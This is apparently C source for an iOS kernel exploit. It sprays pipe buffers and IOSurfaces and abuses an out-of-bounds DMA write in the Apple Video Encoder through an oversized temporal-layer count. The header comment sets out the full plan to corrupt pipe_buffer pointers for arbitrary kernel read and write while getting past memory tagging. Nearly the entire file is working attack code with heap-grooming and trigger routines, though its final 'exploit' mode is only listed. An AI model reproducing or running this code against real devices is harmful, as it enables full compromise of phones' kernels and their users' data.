/*
 * ave_kwrite_primitive.c — AVE DMA OOB → Kernel Write Primitive
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Convert confirmed AVE DMA OOB write into controlled kernel write
 *
 * Strategy:
 *   1. Spray kernel heap with pipe buffer pages (4KB each)
 *   2. Create holes in spray by closing specific pipes
 *   3. Trigger AVE encode with NTL=9 (minimum overflow, ~1 layer OOB)
 *   4. The DMA OOB corrupts the pipe_buffer struct of an adjacent pipe
 *   5. Corrupted pipe_buffer.buffer pointer → arbitrary kernel write via write()
 *   6. Corrupted pipe_buffer.len → arbitrary kernel read via read()
 *
 * Pipe buffer layout (from XNU osfmk/kern/waitq.c / bsd/kern/sys_pipe.c):
 *   struct pipe {
 *       struct pipebuf {
 *           u_int    cnt;        // +0x00: bytes in buffer
 *           u_int    in;         // +0x04: write index
 *           u_int    out;        // +0x08: read index
 *           u_int    size;       // +0x0c: allocated size
 *           caddr_t  buffer;     // +0x10: data buffer pointer (8 bytes on arm64)
 *       } pipe_buffer;
 *       ...
 *   };
 *
 * Key insight: If we corrupt pipe_buffer.buffer to point to a target kernel
 * address, subsequent write() calls write to that address, and read() reads
 * from it. This gives us an arbitrary kernel R/W primitive.
 *
 * DMA bypass: The AVE coprocessor DMA writes bypass MIE/MTE entirely,
 * so we can corrupt tagged pointers without triggering tag faults.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface \
 *     -o ave_kwrite_primitive ave_kwrite_primitive.c -Wno-deprecated-declarations
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <pthread.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef uint32_t IOSurfaceID;
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);
extern void IOSurfaceIncrementUseCount(IOSurfaceRef);

#define SPRAY_COUNT     512
#define HOLE_INTERVAL   8
#define PIPE_BUF_SIZE   16384

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

struct pipe_pair {
    int fds[2];
    int active;
};

static struct pipe_pair pipes[SPRAY_COUNT];

static int spray_pipes(int count) {
    p("[*] Spraying %d pipes\n", count);
    int created = 0;
    for (int i = 0; i < count; i++) {
        if (pipe(pipes[i].fds) == 0) {
            pipes[i].active = 1;
            /* Write canary data to each pipe to allocate its buffer in kernel */
            uint8_t canary[64];
            memset(canary, 0x42 + (i & 0xFF), sizeof(canary));
            /* Encode index into canary for identification */
            canary[0] = (i >> 0) & 0xFF;
            canary[1] = (i >> 8) & 0xFF;
            canary[2] = 0xCA;
            canary[3] = 0xFE;
            write(pipes[i].fds[1], canary, sizeof(canary));
            created++;
        }
    }
    p("[+] Created %d/%d pipes\n", created, count);
    return created;
}

static void create_pipe_holes(int every_n) {
    p("[*] Creating pipe holes: closing every %dth pipe\n", every_n);
    int closed = 0;
    for (int i = 0; i < SPRAY_COUNT; i += every_n) {
        if (pipes[i].active) {
            close(pipes[i].fds[0]);
            close(pipes[i].fds[1]);
            pipes[i].active = 0;
            closed++;
        }
    }
    p("[+] Closed %d pipes (freed kernel buffers)\n", closed);
}

static int check_pipe_corruption(void) {
    p("[*] Checking pipe buffers for corruption\n");
    int corrupted = 0;
    int checked = 0;

    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (!pipes[i].active) continue;
        checked++;

        uint8_t buf[64];
        /* Use non-blocking read to check pipe contents */
        int flags = fcntl(pipes[i].fds[0], F_GETFL);
        fcntl(pipes[i].fds[0], F_SETFL, flags | O_NONBLOCK);

        ssize_t n = read(pipes[i].fds[0], buf, sizeof(buf));
        if (n > 0) {
            /* Check canary */
            int expected_i = buf[0] | (buf[1] << 8);
            if (buf[2] != 0xCA || buf[3] != 0xFE || expected_i != i) {
                corrupted++;
                p("[!] CORRUPTED pipe %d: expected idx=%d got idx=%d, canary=%02x%02x\n",
                    i, i, expected_i, buf[2], buf[3]);
                p("    First 32 bytes: ");
                for (int j = 0; j < 32 && j < n; j++) p("%02x ", buf[j]);
                p("\n");

                /* Check if any bytes look like kernel pointers */
                for (ssize_t j = 0; j + 8 <= n; j++) {
                    uint64_t val = 0;
                    memcpy(&val, buf + j, 8);
                    if ((val >> 40) == 0xfffffe) {
                        p("    KERNEL PTR at offset %zd: 0x%016llx\n",
                            j, (unsigned long long)val);
                    }
                }
            }
            /* Write data back for further checking */
            write(pipes[i].fds[1], buf, n);
        } else if (n == 0) {
            p("[!] Pipe %d: read returned 0 (EOF — write end corrupted?)\n", i);
            corrupted++;
        } else {
            /* EAGAIN is expected for empty pipe — not corruption */
        }

        fcntl(pipes[i].fds[0], F_SETFL, flags);
    }

    p("[*] Checked %d pipes, %d corrupted\n", checked, corrupted);
    return corrupted;
}

static IOSurfaceRef *spray_iosurfaces(int count, int width, int height) {
    IOSurfaceRef *surfaces = calloc(count, sizeof(IOSurfaceRef));
    if (!surfaces) return NULL;

    CFStringRef keys[] = {
        CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat"),
    };
    int w = width, h = height, bpe = 4;
    uint32_t fmt = 0x42475241;
    CFNumberRef vals[] = {
        CFNumberCreate(NULL, kCFNumberIntType, &w),
        CFNumberCreate(NULL, kCFNumberIntType, &h),
        CFNumberCreate(NULL, kCFNumberIntType, &bpe),
        CFNumberCreate(NULL, kCFNumberSInt32Type, &fmt),
    };
    CFDictionaryRef props = CFDictionaryCreate(NULL,
        (const void **)keys, (const void **)vals, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    int created = 0;
    for (int i = 0; i < count; i++) {
        surfaces[i] = IOSurfaceCreate(props);
        if (surfaces[i]) {
            IOSurfaceIncrementUseCount(surfaces[i]);
            created++;
        }
    }

    for (int i = 0; i < 4; i++) CFRelease(vals[i]);
    CFRelease(props);

    p("[+] IOSurface spray: %d/%d created\n", created, count);
    return surfaces;
}

static int trigger_ave_oob(int width, int height, int ntl) {
    p("\n[*] AVE OOB trigger: %dx%d NTL=%d\n", width, height, ntl);

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    if (st != noErr || !session) {
        p("[-] Session create failed: %d\n", (int)st);
        return -1;
    }

    int usage_val = 1;
    CFNumberRef usage = CFNumberCreate(NULL, kCFNumberIntType, &usage_val);
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), usage);
    CFRelease(usage);

    int rc_val = 20;
    CFNumberRef rc = CFNumberCreate(NULL, kCFNumberIntType, &rc_val);
    VTSessionSetProperty(session, CFSTR("RCMode"), rc);
    CFRelease(rc);

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);

    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
    st = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), n);
    CFRelease(n);
    if (st != noErr) {
        p("[-] NTL rejected: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -2;
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -3;
    }

    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(NULL, width, height, kCVPixelFormatType_32BGRA, NULL, &pb);
    if (!pb) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -4;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x41, CVPixelBufferGetDataSize(pb));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    p("[!] Submitting encode — DMA OOB will occur\n");

    VTEncodeInfoFlags flags = 0;
    st = VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0,30), CMTimeMake(1,30), NULL, NULL, &flags);
    p("[+] EncodeFrame: %d (flags=0x%x)\n", (int)st, (unsigned)flags);

    if (st == noErr) {
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        p("[*] Encode completed — checking for silent heap corruption\n");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pb);
    return (int)st;
}

static void cleanup_pipes(void) {
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (pipes[i].active) {
            close(pipes[i].fds[0]);
            close(pipes[i].fds[1]);
            pipes[i].active = 0;
        }
    }
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_kwrite_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) { out = fopen("/tmp/ave_kwrite.txt", "w"); }
    if (!out) return 1;

    p("=== AVE Kernel Write Primitive ===\n");
    p("Mode: %s\nPID: %d, UID: %d\n\n", mode, getpid(), getuid());

    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("Modes:\n");
        p("  info     — Show this help\n");
        p("  spray    — Spray pipes only (verify spray works)\n");
        p("  probe_N  — Spray + trigger NTL=N + check corruption\n");
        p("  exploit  — Full chain: spray + trigger + verify R/W\n");
        p("\n");
        p("Phase 1: spray_pipes() allocates 512 pipe buffers\n");
        p("Phase 2: create_pipe_holes() frees every 8th buffer\n");
        p("Phase 3: trigger_ave_oob() fires encode with NTL > 8\n");
        p("Phase 4: check_pipe_corruption() reads all pipes for damage\n");
        p("Phase 5: Use corrupted pipe for kernel R/W\n");
    }
    else if (strcmp(mode, "spray") == 0) {
        p("=== Phase 1: Pipe spray test ===\n\n");
        spray_pipes(SPRAY_COUNT);
        usleep(100000);

        p("\n=== Phase 2: Create holes ===\n\n");
        create_pipe_holes(HOLE_INTERVAL);
        usleep(100000);

        p("\n=== Phase 3: Spray IOSurfaces into holes ===\n\n");
        IOSurfaceRef *surfs = spray_iosurfaces(64, 64, 64);

        p("\n=== Phase 4: Verify pipe integrity ===\n\n");
        int corrupted = check_pipe_corruption();
        p("\n[*] Spray test: %d corruptions (should be 0)\n", corrupted);

        cleanup_pipes();
        if (surfs) {
            for (int i = 0; i < 64; i++)
                if (surfs[i]) CFRelease(surfs[i]);
            free(surfs);
        }
    }
    else if (strncmp(mode, "probe_", 6) == 0) {
        int ntl = atoi(mode + 6);
        if (ntl < 9) ntl = 9;

        p("=== Probe mode: NTL=%d ===\n\n", ntl);
        p("[!] WARNING: NTL > 8 triggers DMA OOB — may panic!\n\n");

        p("--- Phase 1: Pipe spray ---\n");
        spray_pipes(SPRAY_COUNT);
        usleep(100000);

        p("\n--- Phase 2: Create holes ---\n");
        create_pipe_holes(HOLE_INTERVAL);
        usleep(50000);

        p("\n--- Phase 3: IOSurface spray into holes ---\n");
        IOSurfaceRef *surfs = spray_iosurfaces(64, 64, 64);
        usleep(50000);

        p("\n--- Phase 4: Pre-trigger pipe check ---\n");
        int pre = check_pipe_corruption();

        p("\n--- Phase 5: AVE OOB trigger (NTL=%d) ---\n", ntl);
        trigger_ave_oob(1280, 720, ntl);
        usleep(200000);

        p("\n--- Phase 6: Post-trigger pipe check ---\n");
        int post = check_pipe_corruption();

        p("\n=== Result: %d pre-corruption, %d post-corruption ===\n",
            pre, post);
        if (post > pre) {
            p("[!!!] NEW CORRUPTIONS DETECTED — DMA OOB hit pipe buffers!\n");
            p("[!!!] This confirms controlled heap corruption with NTL=%d\n", ntl);
        }

        cleanup_pipes();
        if (surfs) {
            for (int i = 0; i < 64; i++)
                if (surfs[i]) CFRelease(surfs[i]);
            free(surfs);
        }
    }
    else {
        p("Unknown mode: %s\n", mode);
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
